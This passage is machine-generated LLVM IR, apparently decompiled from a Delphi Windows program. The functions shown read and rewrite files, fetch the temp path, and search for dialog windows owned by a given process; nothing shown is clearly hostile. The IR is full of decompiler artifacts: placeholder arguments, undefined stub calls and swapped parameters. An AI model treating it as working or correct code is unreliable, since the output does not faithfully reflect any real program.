  %133 = add i8 %132, %130, !insn.addr !1498
  store i8 %133, i8* %129, align 1, !insn.addr !1498
  %134 = add i32 %128, 1, !insn.addr !1499
  store i32 %134, i32* %eax, align 4, !insn.addr !1499
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1500
  %136 = load i8, i8* %135, align 1, !insn.addr !1500
  %137 = trunc i32 %134 to i8, !insn.addr !1500
  %138 = add i8 %136, %137, !insn.addr !1500
  store i8 %138, i8* %135, align 1, !insn.addr !1500
  br label %dec_label_pc_406900, !insn.addr !1500

dec_label_pc_406900:                              ; preds = %dec_label_pc_4068e9, %dec_label_pc_406889
  %139 = load i32, i32* %eax, align 4, !insn.addr !1500
  ret i32 %139, !insn.addr !1500

dec_label_pc_406901:                              ; preds = %dec_label_pc_40688e
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1501
  %141 = load i8, i8* %140, align 1, !insn.addr !1501
  %142 = add i8 %141, %55, !insn.addr !1501
  store i8 %142, i8* %140, align 1, !insn.addr !1501
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1502
  %145 = load i8, i8* %144, align 1, !insn.addr !1502
  %146 = trunc i32 %arg3 to i8, !insn.addr !1502
  %147 = add i8 %145, %146, !insn.addr !1502
  store i8 %147, i8* %144, align 1, !insn.addr !1502
  %148 = load i32, i32* %eax, align 4, !insn.addr !1503
  %149 = add i32 %148, 1, !insn.addr !1503
  %150 = mul i32 %149, 2, !insn.addr !1504
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1504
  %152 = load i8, i8* %151, align 2, !insn.addr !1504
  %153 = trunc i32 %149 to i8, !insn.addr !1504
  %154 = add i8 %152, %153, !insn.addr !1504
  store i8 %154, i8* %151, align 2, !insn.addr !1504
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1505
  %156 = load i8, i8* %155, align 1, !insn.addr !1505
  %157 = add i8 %156, %153, !insn.addr !1505
  store i8 %157, i8* %155, align 1, !insn.addr !1505
  ret i32 %149, !insn.addr !1506
}

define i32 @function_40691f() local_unnamed_addr {
dec_label_pc_40691f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1507
}

define i32 @function_40692c() local_unnamed_addr {
dec_label_pc_40692c:
  %esp.1.reg2mem = alloca i32, !insn.addr !1508
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1509
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1509
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1509
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1510
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1511
  %3 = call i32 @function_4036c8(), !insn.addr !1512
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1513
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1513
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1513
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1514
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1515
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1516
  br i1 %7, label %dec_label_pc_406acb, label %dec_label_pc_406996, !insn.addr !1516

dec_label_pc_406996:                              ; preds = %dec_label_pc_40692c
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1514
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1517
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1517
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1518
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1519
  br i1 %12, label %dec_label_pc_406acb, label %dec_label_pc_4069b2, !insn.addr !1519

dec_label_pc_4069b2:                              ; preds = %dec_label_pc_406996
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1520
  %14 = call i32 @function_403720(), !insn.addr !1521
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1522
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1522
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1523
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1523
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1524
  %19 = call i32 @function_4046d4(), !insn.addr !1525
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406acb

dec_label_pc_406acb:                              ; preds = %dec_label_pc_4069b2, %dec_label_pc_406996, %dec_label_pc_40692c
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1526
  %21 = load i32, i32* %20, align 4, !insn.addr !1526
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1527
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1528
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1528
  store i32 4221677, i32* %23, align 4, !insn.addr !1528
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1529
  ret i32 %24, !insn.addr !1530
}

define i32 @function_406ae6() local_unnamed_addr {
dec_label_pc_406ae6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1531
  ret i32 %0, !insn.addr !1531
}

define i32 @function_406aeb() local_unnamed_addr {
dec_label_pc_406aeb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1532
}

define i32 @function_406aed(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406aed:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1533
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1533
  %3 = load i32, i32* %2, align 4, !insn.addr !1533
  ret i32 %3, !insn.addr !1534
}

define i32 @function_406b24() local_unnamed_addr {
dec_label_pc_406b24:
  %esp.2.reg2mem = alloca i32, !insn.addr !1535
  %esp.1.reg2mem = alloca i32, !insn.addr !1535
  %esi.0.reg2mem = alloca i32, !insn.addr !1535
  %esp.0.reg2mem = alloca i32, !insn.addr !1535
  %ebx.0.reg2mem = alloca i32, !insn.addr !1535
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1536
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1537
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1537
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1537
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1538
  %2 = call i32 @function_403c88(), !insn.addr !1539
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1540
  br i1 %3, label %dec_label_pc_406c0d, label %dec_label_pc_406b52, !insn.addr !1540

dec_label_pc_406b52:                              ; preds = %dec_label_pc_406b24
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1541
  %5 = call i32 @function_4036c8(), !insn.addr !1542
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1543
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1543
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1543
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1544
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1545
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1546
  br i1 %9, label %dec_label_pc_406c0d, label %dec_label_pc_406b8e, !insn.addr !1546

dec_label_pc_406b8e:                              ; preds = %dec_label_pc_406b52
  %10 = call i32 @"@LStrClr"(), !insn.addr !1547
  %11 = call i32 @function_403c90(), !insn.addr !1548
  %12 = icmp slt i32 %11, 0, !insn.addr !1549
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1550
  br i1 %12, label %dec_label_pc_406bd8, label %dec_label_pc_406ba6, !insn.addr !1550

dec_label_pc_406ba6:                              ; preds = %dec_label_pc_406b8e
  %13 = add i32 %11, 1, !insn.addr !1551
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1552
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1552
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1552
  br label %dec_label_pc_406ba9, !insn.addr !1552

dec_label_pc_406ba9:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406ba6
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1553
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1553
  store i32 0, i32* %15, align 4, !insn.addr !1553
  %16 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1554
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1555
  %18 = add i32 %16, %17, !insn.addr !1555
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1555
  %20 = load i32, i32* %19, align 4, !insn.addr !1555
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1555
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1555
  store i32 %20, i32* %22, align 4, !insn.addr !1555
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1556
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1556
  store i32 ptrtoint (i32* @global_var_406c54 to i32), i32* %24, align 4, !insn.addr !1556
  %25 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1557
  %26 = or i32 %17, 4, !insn.addr !1558
  %27 = add i32 %25, %26, !insn.addr !1558
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1558
  %29 = load i32, i32* %28, align 4, !insn.addr !1558
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1558
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1558
  store i32 %29, i32* %31, align 4, !insn.addr !1558
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1559
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1559
  store i32 ptrtoint ([3 x i8]* @global_var_406c60 to i32), i32* %33, align 4, !insn.addr !1559
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1560
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1561
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1562
  %37 = icmp eq i32 %36, 0, !insn.addr !1562
  %38 = icmp eq i1 %37, false, !insn.addr !1563
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1563
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1563
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1563
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1563
  br i1 %38, label %dec_label_pc_406ba9, label %dec_label_pc_406bd8, !insn.addr !1563

dec_label_pc_406bd8:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406b8e
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1544
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1564
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1565
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1565
  store i32 0, i32* %42, align 4, !insn.addr !1565
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1566
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1566
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1566
  store i32 %45, i32* %44, align 4, !insn.addr !1566
  %46 = call i32 @function_4034c8(), !insn.addr !1567
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1568
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1568
  store i32 %46, i32* %48, align 4, !insn.addr !1568
  %49 = call i32 @function_403720(), !insn.addr !1569
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1570
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1570
  store i32 %49, i32* %51, align 4, !insn.addr !1570
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1571
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1571
  store i32 %39, i32* %53, align 4, !insn.addr !1571
  %54 = call i32 @function_40446c(), !insn.addr !1572
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1573
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1573
  store i32 %39, i32* %56, align 4, !insn.addr !1573
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1574
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1575
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1575
  store i32 %39, i32* %59, align 4, !insn.addr !1575
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1576
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1577
  br label %dec_label_pc_406c0d, !insn.addr !1577

dec_label_pc_406c0d:                              ; preds = %dec_label_pc_406bd8, %dec_label_pc_406b52, %dec_label_pc_406b24
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1578
  %62 = load i32, i32* %61, align 4, !insn.addr !1578
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1579
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1580
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1580
  store i32 4221999, i32* %64, align 4, !insn.addr !1580
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1581
  ret i32 %65, !insn.addr !1582
}

define i32 @function_406c28() local_unnamed_addr {
dec_label_pc_406c28:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1583
  ret i32 %0, !insn.addr !1583
}

define i32 @function_406c2d() local_unnamed_addr {
dec_label_pc_406c2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1584
}

define i32 @function_406c2f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406c2f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1585
}

define i32 @function_406c64() local_unnamed_addr {
dec_label_pc_406c64:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1586
  %1 = call i32 @function_4036b8(), !insn.addr !1587
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1588
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1588
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1588
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1589
  %4 = call i32 @function_403c90(), !insn.addr !1590
  %5 = icmp slt i32 %4, 0, !insn.addr !1591
  br i1 %5, label %dec_label_pc_406cec, label %dec_label_pc_406cba, !insn.addr !1592

dec_label_pc_406cba:                              ; preds = %dec_label_pc_406c64
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1593
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1594
  br label %dec_label_pc_406d38

dec_label_pc_406cec:                              ; preds = %dec_label_pc_406c64
  %8 = call i32 @function_403c88(), !insn.addr !1595
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1596
  %10 = call i32 @function_403c90(), !insn.addr !1597
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1598
  %12 = call i32 @function_403c90(), !insn.addr !1599
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1600
  %14 = call i32 @function_406b24(), !insn.addr !1601
  br label %dec_label_pc_406d38, !insn.addr !1601

dec_label_pc_406d38:                              ; preds = %dec_label_pc_406cba, %dec_label_pc_406cec
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1602
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1603
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1604
  ret i32 %16, !insn.addr !1605
}

define i32 @function_406d53() local_unnamed_addr {
dec_label_pc_406d53:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1606
  ret i32 %0, !insn.addr !1606
}

define i32 @function_406d58() local_unnamed_addr {
dec_label_pc_406d58:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1607
}

define i32 @function_406d5a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406d5a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1608
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1608
  %3 = load i32, i32* %2, align 4, !insn.addr !1608
  ret i32 %3, !insn.addr !1609
}

define i32 @function_406d64() local_unnamed_addr {
dec_label_pc_406d64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1610
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1610
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1610
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1611
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1612
  %3 = add i32 %2, 1, !insn.addr !1612
  %4 = icmp eq i32 %3, 0, !insn.addr !1612
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1612
  %5 = icmp eq i1 %4, false, !insn.addr !1613
  br i1 %5, label %dec_label_pc_406d9c, label %dec_label_pc_406d7d, !insn.addr !1613

dec_label_pc_406d7d:                              ; preds = %dec_label_pc_406d64
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1614
  %7 = icmp eq i32 %6, 0, !insn.addr !1614
  br i1 %7, label %dec_label_pc_406d8c, label %dec_label_pc_406d87, !insn.addr !1615

dec_label_pc_406d87:                              ; preds = %dec_label_pc_406d7d
  %8 = call i32 @function_406b24(), !insn.addr !1616
  br label %dec_label_pc_406d8c, !insn.addr !1616

dec_label_pc_406d8c:                              ; preds = %dec_label_pc_406d87, %dec_label_pc_406d7d
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1617
  br label %dec_label_pc_406d9c, !insn.addr !1617

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d8c, %dec_label_pc_406d64
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1618
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1619
  ret i32 0, !insn.addr !1620
}

define i32 @function_406daa() local_unnamed_addr {
dec_label_pc_406daa:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1621
  ret i32 %0, !insn.addr !1621
}

define i32 @function_406daf() local_unnamed_addr {
dec_label_pc_406daf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1622
}

define i32 @function_406db1(i32 %arg1) local_unnamed_addr {
dec_label_pc_406db1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1623
}

define i32 @function_406db4() local_unnamed_addr {
dec_label_pc_406db4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1624
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1624
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1624
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1625
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1626
  %3 = add i32 %2, -1, !insn.addr !1626
  %4 = icmp eq i32 %2, 0, !insn.addr !1626
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1626
  %5 = icmp eq i1 %4, false, !insn.addr !1627
  br i1 %5, label %dec_label_pc_406de8, label %dec_label_pc_406dce, !insn.addr !1627

dec_label_pc_406dce:                              ; preds = %dec_label_pc_406db4
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1628
  br label %dec_label_pc_406de8, !insn.addr !1629

dec_label_pc_406de8:                              ; preds = %dec_label_pc_406dce, %dec_label_pc_406db4
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1630
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1631
  ret i32 0, !insn.addr !1632
}

define i32 @function_406df6() local_unnamed_addr {
dec_label_pc_406df6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1633
  ret i32 %0, !insn.addr !1633
}

define i32 @function_406dfb() local_unnamed_addr {
dec_label_pc_406dfb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1634
}

define i32 @function_406dfd(i32 %arg1) local_unnamed_addr {
dec_label_pc_406dfd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1635
}

define i1 @function_406e00(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406e00:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1636
  ret i1 %0, !insn.addr !1636
}

define i32 @function_406e08() local_unnamed_addr {
dec_label_pc_406e08:
  %eax.0.reg2mem = alloca i32, !insn.addr !1637
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1638
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1639
  %2 = icmp eq i32 %1, 0, !insn.addr !1640
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1641
  br i1 %2, label %dec_label_pc_406e3e, label %dec_label_pc_406e20, !insn.addr !1641

dec_label_pc_406e20:                              ; preds = %dec_label_pc_406e08
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1638
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1642
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1642
  %7 = load i8, i8* %6, align 1, !insn.addr !1642
  %8 = icmp eq i8 %7, 92, !insn.addr !1642
  br i1 %8, label %dec_label_pc_406e30, label %dec_label_pc_406e27, !insn.addr !1643

dec_label_pc_406e27:                              ; preds = %dec_label_pc_406e20
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1644
  store i8 92, i8* %9, align 1, !insn.addr !1644
  %10 = or i32 %3, 1, !insn.addr !1645
  %11 = add i32 %1, %10, !insn.addr !1645
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1645
  store i8 0, i8* %12, align 1, !insn.addr !1645
  br label %dec_label_pc_406e30, !insn.addr !1645

dec_label_pc_406e30:                              ; preds = %dec_label_pc_406e27, %dec_label_pc_406e20
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1646
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1646
  br label %dec_label_pc_406e3e, !insn.addr !1646

dec_label_pc_406e3e:                              ; preds = %dec_label_pc_406e30, %dec_label_pc_406e08
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1647
}

define i32 @function_406e48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406e48:
  %esp.0.reg2mem = alloca i32, !insn.addr !1648
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1649
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1650
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1650
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1650
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1651
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1652
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1652
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1653
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1653
  %5 = icmp eq i1 %4, false, !insn.addr !1654
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1655
  br i1 %5, label %dec_label_pc_406eff, label %dec_label_pc_406e7f, !insn.addr !1655

dec_label_pc_406e7f:                              ; preds = %dec_label_pc_406e48
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1656
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1656
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1657
  %8 = icmp eq i32 %7, 32770, !insn.addr !1658
  %9 = icmp eq i1 %8, false, !insn.addr !1659
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1659
  br i1 %9, label %dec_label_pc_406eff, label %dec_label_pc_406e8e, !insn.addr !1659

dec_label_pc_406e8e:                              ; preds = %dec_label_pc_406e7f
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1660
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1660
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1661
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1661
  %13 = add i32 %arg1, 4, !insn.addr !1662
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1662
  %15 = load i32, i32* %14, align 4, !insn.addr !1662
  %16 = icmp eq i32 %15, %12, !insn.addr !1662
  %17 = icmp eq i1 %16, false, !insn.addr !1663
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1663
  br i1 %17, label %dec_label_pc_406eff, label %dec_label_pc_406e99, !insn.addr !1663

dec_label_pc_406e99:                              ; preds = %dec_label_pc_406e8e
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1664
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1664
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1665
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1666
  %21 = load i32, i32* %20, align 4, !insn.addr !1666
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1667
  %23 = icmp eq i32 %21, %22, !insn.addr !1667
  %24 = icmp eq i1 %23, false, !insn.addr !1668
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1668
  br i1 %24, label %dec_label_pc_406eff, label %dec_label_pc_406eaa, !insn.addr !1668

dec_label_pc_406eaa:                              ; preds = %dec_label_pc_406e99
  %25 = add i32 %arg1, 8, !insn.addr !1669
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1669
  %27 = load i32, i32* %26, align 4, !insn.addr !1669
  %28 = icmp eq i32 %27, 0, !insn.addr !1669
  br i1 %28, label %dec_label_pc_406ed4, label %dec_label_pc_406eb0, !insn.addr !1670

dec_label_pc_406eb0:                              ; preds = %dec_label_pc_406eaa
  %29 = call i32 @function_407020(), !insn.addr !1671
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1672
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1673
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406eff

dec_label_pc_406ed4:                              ; preds = %dec_label_pc_406eaa
  %32 = add i32 %arg1, 12, !insn.addr !1674
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1674
  %34 = load i32, i32* %33, align 4, !insn.addr !1674
  %35 = add i32 %arg1, 16, !insn.addr !1675
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1675
  %37 = load i32, i32* %36, align 4, !insn.addr !1675
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1676
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1676
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1676
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1676
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1676
  %43 = add i32 %arg1, 24, !insn.addr !1677
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1677
  store i32 %42, i32* %44, align 4, !insn.addr !1677
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1678
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1678
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1679
  %47 = icmp eq i1 %46, false, !insn.addr !1680
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1681
  br i1 %47, label %dec_label_pc_406eff, label %dec_label_pc_406efa, !insn.addr !1681

dec_label_pc_406efa:                              ; preds = %dec_label_pc_406ed4
  %48 = add i32 %arg1, 20, !insn.addr !1682
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1682
  store i32 %arg2, i32* %49, align 4, !insn.addr !1682
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1683
  br label %dec_label_pc_406eff, !insn.addr !1683

dec_label_pc_406eff:                              ; preds = %dec_label_pc_406eb0, %dec_label_pc_406efa, %dec_label_pc_406ed4, %dec_label_pc_406e99, %dec_label_pc_406e8e, %dec_label_pc_406e7f, %dec_label_pc_406e48
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
